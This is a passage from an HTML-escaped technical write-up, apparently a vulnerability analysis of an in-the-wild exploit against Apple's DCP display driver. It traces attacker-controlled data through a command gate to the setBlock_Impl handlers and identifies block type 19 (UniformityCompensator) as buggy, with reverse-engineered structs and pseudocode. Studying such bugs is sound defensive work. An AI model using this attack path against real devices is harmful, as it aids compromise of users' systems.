class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;BlockHandler&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;this&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;void&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;structure_input_buffer&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; int64 structure_input_size&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; int64 &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;remaining_scalar_inputs&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;unsigned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;cnt_remaining_scalar_inputs&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;CommandGate&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;gate&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;void&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;mapped_mdesc_ptr&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;unsigned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;mapped_mdesc_length&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;This uses a Command Gate (&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;GATI&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;) object (like a call gate in IOKit to serialise calls) to finally get close to actually calling the setBlock_Impl function.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;We need to reverse the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;gate_context&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;structure to follow the controlled data through the gate:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.ecbfc354e58e0a03f109ff9486e9e7688b91b2e0\"&gt;&lt;/a&gt;&lt;a id=\"t.25\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;__attribute__&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;((&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;aligned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;8&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)))&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&amp;nbsp;gate_context&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;BlockHandler&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;the_target_this&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;uint64_t structure_input_buffer&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;void&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;remaining_scalar_inputs&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;uint32_t cnt_remaining_scalar_inputs&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;uint32_t field_28&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;uint64_t controlled_ptr&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;uint32_t controlled_length&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;The callgate object uses that context object to finally call the BLHA setBlock handler:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.af3652c5bd10314e902473b353a7422786c1de2f\"&gt;&lt;/a&gt;&lt;a id=\"t.26\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;callback_used_by_callgate_in_block_19_setBlock&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;UnifiedPipeline&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;parent_pipeline&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;gate_context &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;context&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; int64 a3&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; int64 a4&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; int64 a5&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;return&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;context&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;the_target_this&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;setBlock_Impl&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;context&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;the_target_this&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;back_ptr_to_UPPipeDCP_H13P&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;context&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;structure_input_buffer&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;context&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;remaining_scalar_inputs&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;context&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;cnt_remaining_scalar_inputs&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;context&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;controlled_ptr&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;context&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;controlled_length&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;h2 class=\"HovzfPYjjR-c15 HovzfPYjjR-c8\" id=\"h.3xz0wc9abhwz\"&gt;&lt;span class=\"HovzfPYjjR-c16 HovzfPYjjR-c2\"&gt;SetBlock_Impl&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;And finally we've made it through the whole callstack following the controlled data from &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;IOConnectCallMethod&lt;/span&gt;&lt;span&gt;&amp;nbsp;in userspace on the AP to the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;setBlock_Impl&lt;/span&gt;&lt;span&gt;&amp;nbsp;methods on the DCP!&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The prototype of the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;setBlock_Impl&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;methods looks like this:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.ce1b657ebc4685a8be9f9a3720b828c0f9a2d7ce\"&gt;&lt;/a&gt;&lt;a id=\"t.27\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;setBlock_Impl&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;UPPipeDCP_H13P&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;pipe_parent&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;void&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;structure_input_buffer&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;remaining_scalar_inputs&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;cnt_remaining_scalar_inputs&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;void&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;ptr_via_memdesc&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;unsigned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;len_of_memdesc_mapped_buf&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The exploit calls two &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;setBlock_Impl&lt;/span&gt;&lt;span&gt;&amp;nbsp;methods; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;7&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;19&lt;/span&gt;&lt;span&gt;. 7 is fairly simple and seems to just be used to put controlled data in a known location. 19 is the buggy one. From the log strings we can tell that block type 19 handler is implemented in a file called &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;UniformityCompensator.cpp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c17\"&gt;&lt;a class=\"HovzfPYjjR-c191\" href=\"https://www.benq.com/en-us/knowledge-center/knowledge/screen-uniformity.html\"&gt;Uniformity Compensation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a way to correct for inconsistencies in brightness and colour reproduction across a display panel. Block type 19 sets and gets a data structure containing this correction information. The &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;setBlock_Impl&lt;/span&gt;&lt;span&gt;&amp;nbsp;method calls &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;UniformityCompensator::set&lt;/span&gt;&lt;span&gt;&amp;nbsp;and reaches the following code snippet where &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;controlled_size&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a fully-controlled u32 value read from the structure input and &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;indirect_buffer_ptr&lt;/span&gt;&lt;span&gt;&amp;nbsp;points to the mapped buffer, the contents of which are also controlled:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.7beb7cf889ce845693bd09783570df3d7b3034d3\"&gt;&lt;/a&gt;&lt;a id=\"t.28\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;uint8_t&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;pages &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;compensator&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;inline_buffer&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c30\"&gt;// +0x24&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;for&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;pg_cnt &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;pg_cnt &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;3&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;pg_cnt&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;++)&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; uint8_t&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;this_page &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span 